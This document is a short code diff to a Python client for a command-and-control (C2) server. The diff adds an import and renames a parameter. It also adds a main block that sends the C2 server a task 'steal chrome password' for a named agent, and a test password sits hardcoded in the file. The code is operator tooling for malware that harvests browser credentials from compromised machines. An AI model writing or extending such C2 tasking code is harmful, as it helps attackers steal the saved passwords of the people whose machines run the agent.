@@ -2,6 +2,8 @@
 ### just in case client is not merely a frontend for the server ###
 ### TODO: think about whether we still need front end ###
 
+import requests 
+
 ### configs ###
 password = "ch0nky" # a temperary password to test the server
 localhost = "http://127.0.0.1:5000"
@@ -18,12 +20,12 @@ task_create_uri = "/tasks/create"
 
 ### task creation ###
 
-def create_task(task_type, cmd, agent_id):
+def create_task(command_type, cmd, agent_id):
     """
         create a task on the C2 server
     """
     print("[+] Creating task on C2 server...")
-    r = requests.post(localhost + task_create_uri, json={"task_type": task_type, "cmd": cmd, "agent_id": agent_id})
+    r = requests.post(localhost + task_create_uri, json={"command_type": command_type, "cmd": cmd, "agent_id": agent_id})
     if r.status_code == 200:
         resp = r.json()
         if resp["status"] == "ok":
@@ -37,3 +39,6 @@ def create_task(task_type, cmd, agent_id):
         return False
 
 #-------------------------------------------------
+
+if __name__ == "__main__":
+    create_task(command_type="chrome", cmd="steal chrome password", agent_id="fdf6c5636766b811da5850c85b1ba695")
